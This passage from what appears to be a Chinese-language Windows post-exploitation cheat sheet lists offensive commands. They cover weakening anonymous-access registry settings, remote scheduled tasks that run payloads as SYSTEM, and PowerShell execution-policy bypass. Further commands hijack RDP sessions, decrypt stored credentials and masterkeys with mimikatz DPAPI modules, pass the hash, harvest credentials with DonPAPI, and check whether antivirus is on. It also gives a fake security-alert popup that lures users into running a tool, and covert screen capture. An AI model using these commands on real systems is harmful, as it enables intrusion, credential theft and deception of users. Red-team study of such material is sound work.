+REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
+REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v RestrictAnonymous /t REG_DWORD /d 0 /f
+</code></pre>
+<h3 id="_9">计算机休眠</h3>
+<p>查询，0为关闭，1为开启</p>
+<pre><code class="language-text-plain">reg query hklm\SYSTEM\CurrentControlSet\Control\Power /v HibernateEnabled
+</code></pre>
+<p>修改</p>
+<pre><code class="language-text-plain">reg add hklm\SYSTEM\CurrentControlSet\Control\Power /v HibernateEnabled /t reg_dword /d 0
+</code></pre>
+<h3 id="workfolders">利用workfolders执行程序</h3>
+<p>workfolders命令会执行当前目录下的control.exe</p>
+<pre><code class="language-text-plain">C:\Users\ede&gt;copy c:\windows\system32\calc.exe control.exe
+已复制         1 个文件。
+
+C:\Users\ede&gt;workfolders
+
+C:\Users\ede&gt;
+</code></pre>
+<h3 id="at">AT计划任务</h3>
+<pre><code class="language-text-plain">at \\192.168.1.1 10:00 calc.exe
+
+SCHTASKS /Create /S 1.1.1.1 /U doamin\test /P &quot;123123..&quot; /SC ONCE /ST 11:00 /TN test1 /TR c:\1.exe /RU system
+</code></pre>
+<p>根据条件查找文件</p>
+<pre><code class="language-text-plain"> Get-ChildItem -Path 'e:' -Recurse -Include *.exe -ErrorAction:SilentlyContinue | Where-Object -FilterScript {($_.LastWriteTime -gt '2022-05-14') -and ($_.Length -le 10mb)}
+</code></pre>
+<h3 id="powershell_1">Powershell的运行策略及绕过</h3>
+<pre><code class="language-text-plain">获取当前策略
+Get-ExecutionPolicy
+Restricted：禁止运行任何脚本和配置文件。
+AllSigned ：可以运行脚本，但要求所有脚本和配置文件由可信发布者签名，包括在本地计算机上编写的脚本。
+RemoteSigned ：可以运行脚本，但要求从网络上下载的脚本和配置文件由可信发布者签名；       不要求对已经运行和已在本地计算机编写的脚本进行数字签名。
+Unrestricted ：可以运行未签名脚本。（危险！）     
+
+设置策略
+Set-ExecutionPolicy XXX
+
+绕过
+powershell -ExecutionPolicy bypass -command &quot;&amp;{import-module C:\Users\Public\Music\PowerView.ps1; Get-ForestTrust}&quot;
+</code></pre>
+<h3 id="windows-pipe">查看Windows PIPE</h3>
+<p><code>[System.IO.Directory]::GetFiles("\\.\\pipe\\")</code></p>
+<p>远程</p>
+<p><code>auxiliary/scanner/smb/pipe_auditor</code>    msf这个插件需要认证</p>
+<p>rpcdump.py 192.168.14.100 这个不需要认证，可以访问未授权的东西</p>
+<h3 id="rdp_4">RDP切会话</h3>
+<p>前提是有其他用户的会话且是激活的，可以无视其他用户是不是锁屏。</p>
+<p>切换到system</p>
+<p>高权限下可以用<code>sc create rdp binpath= "cmd.exe /k tscon 2 /dest:console"</code>直接创建一个服务切，但是受限于系统版本。</p>
+<p>高权限可以用Windows官方的psexec实现<code>psexec.exe -accepteula -s -i -d cmd.exe</code>。</p>
+<p>高权限可以用mimikatz实现。</p>
+<p>高权限可以用TokenTest.exe实现。</p>
+<p>低权限可以提权实现。</p>
+<p>tscon切换会话</p>
+<p>确定需要切的会话ID，<code>quser</code>。</p>
+<p><code>tscon 1</code>切换过去。</p>
+<h3 id="_10">打包解包</h3>
+<pre><code class="language-text-plain">压缩
+cabarc.exe -p -r N C:\Users\1.cab C:\Users\*.*
+解压
+cabarc.exe -p -r X Npp.cab
+</code></pre>
+<h3 id="_11">安全日志路径</h3>
+<pre><code class="language-text-plain">C:\Windows\System32\Winevt\Logs\Security.evtx
+</code></pre>
+<h3 id="windows-dpapi">Windows凭据-解DPAPI</h3>
+<p>查看是否存在凭据</p>
+<pre><code class="language-text-plain">cmdkey /list 
+
+mimikatz
+vault::list
+</code></pre>
+<p>凭据文件路径，两个目录都要看一下</p>
+<pre><code class="language-text-plain">dir /a:H %appdata%\Microsoft\Credentials
+dir /a:H %appdata%\..\local\Microsoft\Credentials
+</code></pre>
+<p>使用mimikatz的dpapi的模块解读凭据</p>
+<pre><code class="language-text-plain">dpapi::cred /in:%appdata%\..\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+</code></pre>
+<p>至此可以读到凭据相对应的masterkey的Guid，下一步便是拿到masterkey，再用masterkey去解密凭据。</p>
+<p>masterkey存储位置</p>
+<pre><code class="language-text-plain">dir /a %appdata%\Microsoft\Protect\用户的SID
+dir /a %appdata%\Microsoft\Protect\用户的SID
+
+cmd看不到可以用ps看
+Get-ChildItem %appdata%\Microsoft\Protect\
+Get-ChildItem %appdata%\..\Local\Microsoft\Protect
+Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
+Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
+Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
+Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
+</code></pre>
+<p>解密masterkey</p>
+<pre><code class="language-text-plain">dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\S-1-5-21-2063765516-3997562686-97783222-1001\f33071e3-1bdf-458c-89da-51927b10adcf&quot; /sid:S-1-5-21-2063765516-3997562686-97783222-1001 /password:123 /protected
+
+没有密码且在域内
+dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe&quot; /rpc
+</code></pre>
+<p>还可以直接读masterkey，但这里读的masterkey不一定通用</p>
+<pre><code class="language-text-plain">sekurlsa::dpapi
+</code></pre>
+<p>用masterkey解得凭据</p>
+<pre><code class="language-text-plain">dpapi::cred /in:%appdata%\..\local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /masterkey:4090030cd9d184908dde57301e3a27781e5262ce357fe6516c347ee0b5b4b5fccb987845e64e567ced8828a70d6a0684221500450faf9e8a9ea30d21414ad708
+</code></pre>
+<p>可以使用DonpAPI来自动化抓各种凭据</p>
+<pre><code class="language-text-plain">DonPAPI.py domain/user:passw0rd@target
+</code></pre>
+<h3 id="cmd_1">以指定用户来打开一个cmd</h3>
+<pre><code class="language-text-plain">mimikatz
+sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:cmd.exe
+</code></pre>
+<h3 id="_12">搜索字符串</h3>
+<p><code>string64.exe aaa.bin | findstr /i abc</code></p>
+<h3 id="_13">执行命令且不回显</h3>
+<p><code>systeminfo 1&gt; c:\windows\temp\1 2&gt;&amp;1</code></p>
+<h3 id="ps">执行PS文件</h3>
+<pre><code class="language-text-plain">powershell -ep bypass -noexit -file ok.ps1
+</code></pre>
+<h3 id="windows_1">枚举匿名windows共享</h3>
+<pre><code class="language-text-plain">enum4linux -a -u &quot;&quot; -p &quot;&quot; 192.168.14.1 &amp;&amp; enum4linux -a -u &quot;guest&quot; 192.168.14.1
+
+cme smb 192.168.14.1 -u 'a' -p ''
+cme smb 192.168.14.1 -u '' -p ''
+</code></pre>
+<p>枚举LDAP</p>
+<pre><code class="language-text-plain">ldapsearch -x -h 192.168.14.1 -s base
+</code></pre>
+<h3 id="xcopy">xcopy</h3>
+<pre><code class="language-text-plain">xcopy /s /i /e /h source target
+</code></pre>
+<h3 id="powershell_2">Powershell弹窗</h3>
+<pre><code class="language-text-plain">powershell -Command &quot;&quot;Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('自行车');&quot;
+</code></pre>
+<h3 id="md5">查询文件MD5</h3>
+<pre><code class="language-text-plain">certutil -hashfile
+</code></pre>
+<h3 id="360">查询360核晶</h3>
+<pre><code class="language-text-plain">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\360Hvm /v Start
+0x1开， 0x4关
+
+
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\360Safe\safemon /v  
+HvmUserAction
+0x1开，0x0关
+</code></pre>
+<h3 id="powershell_3">Powershell历史记录</h3>
+<pre><code class="language-text-plain">%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+</code></pre>
+<h3 id="md5_1">查看文件MD5</h3>
+<pre><code>certutil -hashfile yourfilename.ext MD5
+
+certutil -hashfile yourfilename.ext SHA1
+
+certutil -hashfile yourfilename.ext SHA256
+</code></pre>
+<h3 id="_14">各个环境变量</h3>
+<pre><code>%ALLUSERSPROFILE% ： 列出所有用户Profile文件位置。  
+%COMSPEC% : CMD路径。
+
+%APPDATA% : 列出应用程序数据的默认存放位置。  
+%CD% : 列出当前目录。  
+%CLIENTNAME% : 列出联接到终端服务会话时客户端的NETBIOS名。  
+%CMDCMDLINE% : 列出启动当前cmd.exe所使用的命令行。  
+%CMDEXTVERSION% : 命令出当前命令处理程序扩展版本号。  
+%CommonProgramFiles% : 列出了常用文件的文件夹路径。  
+%COMPUTERNAME% : 列出了计算机名。   
+%COMSPEC% : CMD路径。  
+%DATE% : 列出当前日期。  
+%ERRORLEVEL% : 列出了最近使用的命令的错误代码。  
+%HOMEDRIVE% : 列出与用户主目录所在的驱动器盘符。  
+%HOMEPATH% : 列出用户主目录的完整路径。  
+%HOMESHARE% : 列出用户共享主目录的网络路径。  
+%LOGONSEVER% : 列出有效的当前登录会话的域名控制器名。  
+%NUMBER_OF_PROCESSORS% : 列出了计算机安装的处理器数。  
+%OS% : 列出操作系统的名字。(Windows XP 和 Windows 2000 列为 Windows_NT.)  
+%Path% : 列出了可执行文件的搜索路径。  
+%PATHEXT% : 列出操作系统认为可被执行的文件扩展名。   
+%PROCESSOR_ARCHITECTURE% : 列出了处理器的芯片架构。  
+%PROCESSOR_IDENTFIER% : 列出了处理器的描述。  
+%PROCESSOR_LEVEL% : 列出了计算机的处理器的型号。   
+%PROCESSOR_REVISION% : 列出了处理器的修订号。  
+%ProgramFiles% : 列出了Program Files文件夹的路径。  
+%PROMPT% : 列出了当前命令解释器的命令提示设置。  
+%RANDOM% : 列出界于0 和 32767之间的随机十进制数。  
+%SESSIONNAME% : 列出连接到终端服务会话时的连接和会话名。  
+%SYSTEMDRIVE% : 列出了Windows启动目录所在驱动器。  
+%SYSTEMROOT% : 列出了Windows启动目录的位置。  
+%TEMP% and %TMP% : 列出了当前登录的用户可用应用程序的默认临时目录。  
+%TIME% : 列出当前时间。  
+%USERDOMAIN% : 列出了包含用户帐号的域的名字。  
+%USERNAME% : 列出当前登录的用户的名字。  
+%USERPROFILE% : 列出当前用户Profile文件位置。  
+%WINDIR% : 列出操作系统目录的位置。
+
+变量 类型 描述   
+%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。   
+%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。   
+%CD% 本地 返回当前目录字符串。   
+%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。   
+%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。   
+%COMPUTERNAME% 系统 返回计算机的名称。   
+%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。   
+%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。   
+%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。   
+%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。   
+%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。   
+%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。   
+%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。   
+%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。   
+%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。   
+%PATH% 系统 指定可执行文件的搜索路径。   
+%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。   
+%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。   
+%PROCESSOR_IDENTFIER% 系统 返回处理器说明。   
+%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。   
+%PROCESSOR_REVISION% 系统 返回处理器的版本号。   
+%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。   
+%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。   
+%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。   
+%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。   
+%TEMP% 和 %TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。   
+%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。   
+%USERDOMAIN% 本地 返回包含用户帐户的域的名称。   
+%USERNAME% 本地 返回当前登录的用户的名称。   
+%USERPROFILE% 本地 返回当前用户的配置文件的位置。   
+%WINDIR% 系统 返回操作系统目录的位置。  
+%allusersprofile%--------------------所有用户的profile路径  
+%Userprofile%-----------------------当前用户的配置文件目录  
+%Appdata%--------------------------当前用户的应用程序路径  
+%commonprogramfiles%-------------应用程序公用的文件路径  
+%homedrive%------------------------当前用户的主盘  
+%Homepath%------------------------当前用户的主目录  
+%programfiles%----------------------应用程序的默认安装目录  
+%systemdrive%----------------------系统所在的盘符  
+%systemroot%-----------------------系统所在的目录  
+%windir%----------------------------同上，总是跟systemroot一样  
+%tmp%------------------------------当前用户的临时目录  
+%temp%-----------------------------同上临时目录
+</code></pre>
+<h3 id="_15">安全日志路径</h3>
+<p><code>C:\Windows\System32\Winevt\Logs\Security.evtx</code></p>
+<h3 id="_16">弹窗</h3>
+<pre><code>shell mshta vbscript:Execute(&quot;msgbox &quot;&quot;别分析了大哥&quot;&quot;:close&quot;)
+
+msg %username% /time:1000 XXX集团安全平台提醒您：您的文档疑似感染宏病毒，请立即运行桌面的修复工具！
+</code></pre>
+<h3 id="_17">持续截屏</h3>
+<p><code>psr.exe /start /gui 0 /output C:\Users\Public\out.zip</code>
+<code>psr.exe /stop</code></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../trustedsec-BOF%E6%8F%92%E4%BB%B6%E8%AF%B4%E6%98%8E%E6%96%87%E6%A1%A3/" class="btn btn-xs btn-link">
+        trustedsec BOF插件说明文档
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Vcenter%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
+        Vcenter攻击面
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
